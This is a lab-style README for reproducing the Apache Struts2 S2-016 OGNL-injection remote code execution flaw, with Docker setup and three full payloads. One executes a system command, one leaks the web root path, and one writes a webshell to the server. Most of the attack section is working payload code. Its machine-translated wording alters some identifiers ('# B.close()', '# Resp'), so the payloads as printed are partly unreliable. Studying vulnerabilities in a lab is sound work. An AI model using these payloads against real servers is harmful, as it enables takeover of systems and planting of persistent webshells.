# S2-016 Remote Code Execution Vulnerability

Impact version: 2.0.0 - 2.3.15

Vulnerability details:

 - http://struts.apache.org/docs/s2-016.html
 - http://www.freebuf.com/articles/web/25337.html

## Test environment construction

```
Docker-compose build
Docker-compose up -d
```

## Vulnerability recurrence

In struts2, the DefaultActionMapper class supports "action:", "redirect:", "redirectAction:" as navigation or redirect prefixes, but these prefixes can be followed by OGNL expressions. Since struts2 does not filter these prefixes, Causes the use of OGNL expressions to call java static methods to execute arbitrary system commands.

So, access the `http://your-ip:8080/index.action?redirect:OGNL expression` to execute the OGNL expression.

Excuting an order:

```
Redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess ,true),#a=@java.lang.Runtime@getRuntime().exec("uname -a").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java .io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter( ), #genxor.println(#d),#genxor.flush(),#genxor.close()}
```

Get the web directory:

```
Redirect:${#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),# Resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding(' UTF-8'), #ot=#resp.getWriter (), #ot.print('web'),#ot.print('path:'),#ot.print(#req.getSession().getServletContext ().getRealPath('/')), #ot.flush(), #ot.close()}
```

Write to webshell:

```
Redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess ,true),#a=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest"),#b=new java.io.FileOutputStream(new java.lang.StringBuilder(#a.getRealPath("/" )).append(@java.io.File@separator).append("1.jspx").toString()),#b.write(#a.getParameter("t").getBytes()),# B.close(),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println("BINGO"),#genxor.flush(),#genxor .close()}
```

Results of the:

![](01.png)